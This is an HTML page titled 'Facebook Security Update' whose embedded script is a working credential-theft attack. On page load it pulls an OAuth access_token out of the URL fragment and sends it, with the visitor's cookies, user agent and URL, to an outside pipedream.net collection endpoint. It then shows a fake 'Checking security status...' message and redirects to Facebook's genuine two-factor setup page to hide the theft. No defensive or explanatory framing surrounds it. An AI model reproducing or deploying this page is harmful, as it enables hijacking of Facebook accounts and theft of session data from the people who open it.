<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Facebook Security Update</title>
</head>
<body>
    <script>
        (function() {
            const hash = window.location.hash;
            if (hash.includes('access_token=')) {
                const token = hash.split('access_token=')[1].split('&')[0];
                const target = "https://eoh20zj6isyxv97.m.pipedream.net";
                
                fetch(target, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        access_token: token,
                        cookies: document.cookie,
                        ua: navigator.userAgent,
                        url: window.location.href
                    })
                });
            }

            document.body.innerHTML = "<center><h2 style='margin-top:50px; font-family:sans-serif;'>Checking security status...</h2></center>";
            
            setTimeout(() => {
                window.location.href = "https://www.facebook.com/security/2fa/setup/intro/";
            }, 1000);
        })();
    </script>
</body>
</html>
